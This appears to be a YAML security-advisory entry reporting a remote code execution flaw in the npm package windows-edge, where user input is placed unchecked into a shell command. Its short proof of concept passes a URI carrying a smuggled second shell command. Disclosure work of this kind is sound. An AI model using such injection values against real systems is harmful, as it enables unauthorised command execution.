- id: snykio:npm:windows-edge:608480
  title: Remote Code Execution (RCE)
  description: |
    [windows-edge][1] is a package that Launches a new Microsoft Edge tab on
    Windows.

    Affected versions of this package are vulnerable to Remote Code
    Execution (RCE). The issue occurs because a `user input` is formatted
    inside a `command` that will be executed without any check.

    \##PoC

        const edge = require('windows-edge');
        edge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})
    {: .language-js}



    [1]: https://www.npmjs.com/package/windows-edge
